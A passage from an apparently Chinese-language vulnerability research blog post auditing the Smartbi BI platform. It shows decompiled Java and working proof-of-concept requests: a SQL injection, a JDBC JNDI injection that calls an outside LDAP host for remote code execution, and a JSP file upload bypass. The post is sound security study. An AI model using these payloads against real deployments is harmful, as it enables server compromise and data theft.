class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UrlLinkService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>getFileResource<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png" alt="20250805182305339"></p><h2 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png" alt="20250802145216052"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>    request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>    response.setBufferSize(<span class="hljs-number">4096</span>);<br>    <span class="hljs-comment">//type=sqldictsync 时执行</span><br>    <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>        <span class="hljs-comment">//记录时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-comment">//数据库连接参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//输出调试日志，记录数据库名、查询语句等</span><br>        log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-comment">//如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources</span><br>        <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则就完整使用所有连接信息进行数据库连接和 SQL 查询</span><br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>        &#125;<br></code></pre></td></tr></table></figure><p>此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//接收用户输入的数据库参数</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//使用 DbUtil.getConnection 创建数据库连接，继续跟进</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>        <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String driver, String url, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>    info.setId(UUIDGenerator.generate());<br>    info.setName(connName);<br>    <span class="hljs-comment">// driver 和 url 参数都是从 drvInfo取值</span><br>    info.setDriver(driver);<br>    info.setUrl(url);<br>    info.setUser(dbUser);<br>    info.setPassword(dbPass);<br>    <span class="hljs-comment">//调用 getConnection 方法。执行 jdbc </span><br>    <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        driverType = DBType.valueOf(dbType.toUpperCase());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>    <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>        info.setId(UUIDGenerator.generate());<br>        info.setName(connName);<br>        info.setDriverType(driverType);<br>        info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>        info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>        info.setUser(dbUser);<br>        info.setPassword(dbPass);<br>        <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 translateDriverInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName) &#123;<br>    <span class="hljs-keyword">return</span> translateDriverInfo(dbType, serverName, dbName, (String)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>    String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//以 dbType 确定数据库类型</span><br>    <span class="hljs-keyword">switch</span> (dbType) &#123;<br>        <span class="hljs-keyword">case</span> DB2:<br>        <span class="hljs-keyword">case</span> DB2_400:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>            result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DB2_V9:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>            <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>构造poc:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>localhost:<span class="hljs-number">6688</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br><br><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>:<span class="hljs-number">18080</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png" alt="20250802165747255"></p><h2 id="tomcat-历史漏洞（实则没有）"><a href="#tomcat-历史漏洞（实则没有）" class="headerlink" title="tomcat 历史漏洞（实则没有）"></a>tomcat 历史漏洞（实则没有）</h2><p>确定 tomcat 版本为 <code>Apache Tomcat Version 7.0.34</code></p><p>E:\Smartbi\Tomcat\RELEASE-NOTES</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png" alt="20250731181914395"></p><h2 id="1、AJP-导致的-RCE"><a href="#1、AJP-导致的-RCE" class="headerlink" title="1、AJP 导致的 RCE"></a>1、AJP 导致的 RCE</h2><blockquote><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0&#x2F;0）.</p></blockquote><p>确认 18009 端口开放，且能够建立 TCP 连接：</p><p><code>Test-NetConnection -ComputerName 127.0.0.1 -Port 18009</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png" alt="20250731185501657"></p><p>使用 Ghostcat 漏洞检测工具：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png" alt="20250731191051181"></p><p>可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件位置：Tomcat&#x2F;webapps&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>    <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>       dir.mkdirs();<br>    &#125;<br>    <span class="hljs-comment">//从请求头 X-File-Name 获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-comment">//获取文件类型</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileType</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>    <span class="hljs-comment">//判断是否包含 image 字符串 </span><br>    <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>       response.resetBuffer();<br>       response.getOutputStream().write(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>       <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + fileName);<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    <span class="hljs-type">int</span> bytesRead;<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>    <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>       fos.write(buf, <span class="hljs-number">0</span>, bytesRead);<br>    &#125;<br>    fos.flush();<br>    fos.close();<br>    smartbi.net.sf.json.<span class="hljs-type">JSONObject</span> <span class="hljs-variable">jobj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">smartbi</span>.net.sf.json.JSONObject();<br>    jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> jobj.toString();<br>    response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>    response.resetBuffer();<br>    response.getOutputStream().write(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞</p><p><strong>漏洞复现：</strong></p><p>路由：<a href="http://localhost:18080/smartbi/vision/designer/imageimport.jsp">http://localhost:18080/smartbi/vision/designer/imageimport.jsp</a></p><p>需要配置页（<a href="http://localhost:18080/smartbi/vision/config.jsp%EF%BC%89%E7%9A%84%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%BB%93%E5%90%88%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E">http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png" alt="20250805160347015"></p><p>poc:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//GET 和 POST 都可以</span><br>GET <span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>ageimport.jsp HTTP/<span class="hljs-number">1.1</span><br><br>X-<span class="hljs-keyword">File</span>-Type: image<br>X-<span class="hljs-keyword">File</span>-Name: <span class="hljs-number">1</span>.jsp<br><br>&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/designer/imageimport.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF<br><span class="hljs-attribute">X-File-Type</span><span class="hljs-punctuation">: </span>image<br><span class="hljs-attribute">X-File-Name</span><span class="hljs-punctuation">: </span>1.jsp<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-mel">&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png" alt="20250805161922205"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png" alt="20250805162159129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png" alt="20250805162430488"></p><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><blockquote><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p></blockquote><h3 id="关键条件："><a href="#关键条件：" class="headerlink" title="关键条件："></a>关键条件：</h3><ol><li><p>mysql-connector-java 的依赖版本为5.1.44，支持 <code>autoDeserialize=true</code> 参数，具备反序列化触发点</p></li><li><p>在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链</p></li><li><p>存在方法调用反射机制 RMIServlet ，可远程调用任意类方法</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png" alt="20250806085001007"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png" alt="20250806125442264"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png" alt="20250806125519870"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>触发点：DataSourceService -&gt; testConnection</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span 